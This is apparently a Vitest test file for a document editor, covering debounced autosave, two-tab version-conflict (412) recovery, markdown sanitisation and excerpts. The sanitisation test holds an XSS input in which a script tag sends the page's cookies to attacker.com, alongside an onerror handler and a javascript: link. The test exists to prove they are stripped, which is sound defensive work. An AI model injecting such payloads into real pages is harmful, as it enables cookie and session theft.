import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  formatETag,
  parseStrongETag,
  sanitizeMarkdown,
  extractMarkdownExcerpt,
  type DocDTO,
} from '@workspace/core';

describe('Web Document UI — 1-Second Autosave & OCC Conflict Recovery (Requirement N-3)', () => {
  const initialDoc: DocDTO = {
    id: '019318ef-0000-7000-8000-000000000101',
    orgId: '019318ef-0000-7000-8000-000000000102',
    nodeId: '019318ef-0000-7000-8000-000000000103',
    title: 'Architecture Decision Log',
    bodyMd: '# Architecture Decisions\n\nInitial draft of system specifications.',
    version: 1,
    createdBy: '019318ef-0000-7000-8000-000000000104',
    updatedBy: '019318ef-0000-7000-8000-000000000104',
    creator: { id: '019318ef-0000-7000-8000-000000000104', name: 'Alex Mercer', email: 'alex@example.com' },
    updater: { id: '019318ef-0000-7000-8000-000000000104', name: 'Alex Mercer', email: 'alex@example.com' },
    node: { id: '019318ef-0000-7000-8000-000000000103', name: 'Platform Engineering', kind: 'team', visibility: 'public' },
    archivedAt: null,
    createdAt: '2026-10-06T00:00:00.000Z',
    updatedAt: '2026-10-06T00:00:00.000Z',
  };

  beforeEach(() => {
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('1. 1000ms Debounce & In-Flight Draft Generation Coordination', () => {
    it('debounces rapid typing for 1 second before submitting save', () => {
      let status: 'saved' | 'saving' | 'unsaved' = 'saved';

      const mockSave = vi.fn(() => {
        status = 'saving';
      });

      let timer: NodeJS.Timeout | null = null;
      const handleInput = () => {
        status = 'unsaved';
        if (timer) clearTimeout(timer);
        timer = setTimeout(() => {
          mockSave();
        }, 1000);
      };

      // User types 5 characters rapidly within 400ms
      handleInput(); // 0ms
      vi.advanceTimersByTime(100);
      handleInput(); // 100ms
      vi.advanceTimersByTime(100);
      handleInput(); // 200ms
      vi.advanceTimersByTime(100);
      handleInput(); // 300ms
      vi.advanceTimersByTime(100);
      handleInput(); // 400ms

      expect(status).toBe('unsaved');
      expect(mockSave).not.toHaveBeenCalled();

      // Advance by 999ms (not yet 1s since last keystroke)
      vi.advanceTimersByTime(999);
      expect(mockSave).not.toHaveBeenCalled();

      // Advance 1ms more -> exactly 1000ms of inactivity reached
      vi.advanceTimersByTime(1);
      expect(mockSave).toHaveBeenCalledTimes(1);
      expect(status).toBe('saving');
    });

    it('buffers incoming draft updates when an HTTP save is in flight and queues follow-up save', async () => {
      let draftGen = 0;
      let submittedGen = 0;
      let inFlight = false;
      let status: 'saved' | 'saving' | 'unsaved' = 'saved';
      const executedSaves: number[] = [];

      const performSave = async () => {
        if (inFlight) return;
        inFlight = true;
        submittedGen = draftGen;
        status = 'saving';
        executedSaves.push(submittedGen);

        // Simulate async network request
        await new Promise((resolve) => setTimeout(resolve, 300));
        inFlight = false;

        // If draft was modified while in flight, queue next pass
        if (draftGen > submittedGen) {
          status = 'unsaved';
          setTimeout(() => {
            performSave();
          }, 1000);
        } else {
          status = 'saved';
        }
      };

      // 1. Initial keystroke (gen 1)
      draftGen = 1;
      performSave(); // Launches save for gen 1
      expect(status).toBe('saving');
      expect(executedSaves).toEqual([1]);

      // 2. User continues typing while save is in flight (gen 2, gen 3)
      draftGen = 2;
      draftGen = 3;

      // 3. Complete first network save (300ms)
      await vi.advanceTimersByTimeAsync(300);

      // Save 1 finished, but draftGen (3) > submittedGen (1) -> status becomes unsaved
      expect(status).toBe('unsaved');

      // 4. Advance timers by 1000ms debounce
      await vi.advanceTimersByTimeAsync(1000);

      // Follow-up save for gen 3 was executed
      expect(executedSaves).toEqual([1, 3]);

      // 5. Complete second network save
      await vi.advanceTimersByTimeAsync(300);
      expect(status).toBe('saved');
    });
  });

  describe('2. Two-Tab Stale-Edit (412 Conflict) & Recovery Journey', () => {
    it('simulates Tab A committing v2, Tab B receiving 412, preserving draft in memory, and resolving conflict', () => {
      let serverDoc: DocDTO = { ...initialDoc };

      // Tab A loaded doc at v1
      let tabADoc: DocDTO = { ...initialDoc };
      const tabADraft = {
        title: 'Architecture Decision Log (Updated by Tab A)',
        bodyMd: '# Architecture Decisions\n\nUpdated by Tab A.',
      };

      // Tab B loaded doc at v1
      let tabBDoc: DocDTO = { ...initialDoc };
      const tabBDraft = {
        title: 'Architecture Decision Log with Security Matrix (Authored by Tab B)',
        bodyMd: '# Architecture Decisions\n\nAuthored by Tab B with confidential additions.',
      };

      // --- STEP 1: Tab A saves first ---
      const tabAIfMatch = formatETag(tabADoc.version); // '"v1"'
      const expectedA = parseStrongETag(tabAIfMatch);
      expect(expectedA).toBe(serverDoc.version);

      // Server increments version to 2
      serverDoc = {
        ...serverDoc,
        title: tabADraft.title,
        bodyMd: tabADraft.bodyMd,
        version: 2,
        updatedAt: '2026-10-06T00:01:00.000Z',
      };
      tabADoc = { ...serverDoc };
      expect(tabADoc.version).toBe(2);

      // --- STEP 2: Tab B attempts autosave using stale v1 ---
      const tabBIfMatch = formatETag(tabBDoc.version); // '"v1"'
      const expectedB = parseStrongETag(tabBIfMatch);

      // Server detects conflict (expected 1 !== server version 2)
      let tabBStatus = 200;
      let tabBConflictEntity: DocDTO | null = null;

      if (expectedB !== serverDoc.version) {
        tabBStatus = 412;
        tabBConflictEntity = serverDoc; // Returns fresh server entity
      }

      expect(tabBStatus).toBe(412);
      expect(tabBConflictEntity).not.toBeNull();
      expect(tabBConflictEntity?.version).toBe(2);

      // Tab B preserves user draft in memory!
      const tabBLocalTitle = tabBDraft.title;
      const tabBLocalBody = tabBDraft.bodyMd;
      expect(tabBLocalTitle).toBe(tabBDraft.title);
      expect(tabBLocalBody).toBe(tabBDraft.bodyMd);

      // --- STEP 3: Tab B chooses "Overwrite (keep my changes)" ---
      // Tab B adopts fresh server version 2 for its strong If-Match header
      const tabBOverwriteIfMatch = formatETag(tabBConflictEntity!.version); // '"v2"'
      expect(tabBOverwriteIfMatch).toBe('"v2"');

      // Server executes overwrite
      serverDoc = {
        ...serverDoc,
        title: tabBLocalTitle,
        bodyMd: tabBLocalBody,
        version: serverDoc.version + 1, // 3
        updatedAt: '2026-10-06T00:02:00.000Z',
      };

      tabBDoc = { ...serverDoc };
      expect(tabBDoc.version).toBe(3);
      expect(tabBDoc.title).toBe(tabBDraft.title);
      expect(tabBDoc.bodyMd).toBe(tabBDraft.bodyMd);
    });

    it('allows Tab B to discard draft and load server version upon 412 conflict', () => {
      const serverDoc: DocDTO = {
        ...initialDoc,
        version: 2,
        title: 'Server Authoritative Title v2',
        bodyMd: '# Server Authoritative Content v2',
      };

      let localTitle = 'Unsaved local draft';
      let localBody = 'Unsaved local body';
      let saveStatus = 'conflict';

      // User clicks "Discard my edits & load server"
      localTitle = serverDoc.title;
      localBody = serverDoc.bodyMd;
      saveStatus = 'saved';

      expect(localTitle).toBe('Server Authoritative Title v2');
      expect(localBody).toBe('# Server Authoritative Content v2');
      expect(saveStatus).toBe('saved');
    });
  });

  describe('3. Markdown Rendering Security & Excerpt Integrity', () => {
    it('blocks dangerous HTML script injection and malicious attributes', () => {
      const attackVector = `# Safe Title
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
<img src="avatar.png" onerror="alert('xss')">
<a href="javascript:void(0)">Harmful link</a>
Safe markdown text here.`;

      const sanitized = sanitizeMarkdown(attackVector);

      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('attacker.com');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).toContain('# Safe Title');
      expect(sanitized).toContain('Safe markdown text here.');
    });

    it('generates accurate plaintext excerpts within designated length', () => {
      const markdown = `# Workspace System Specifications
Workspace v1 provides **multi-tenant project management**, real-time collaboration, and *version history*.
- Feature A: Task management
- Feature B: Document versioning`;

      const excerpt = extractMarkdownExcerpt(markdown, 80);
      expect(excerpt.length).toBeLessThanOrEqual(83); // 80 + '...'
      expect(excerpt).not.toContain('#');
      expect(excerpt).not.toContain('**');
      expect(excerpt).toContain('Workspace System Specifications');
    });
  });
});
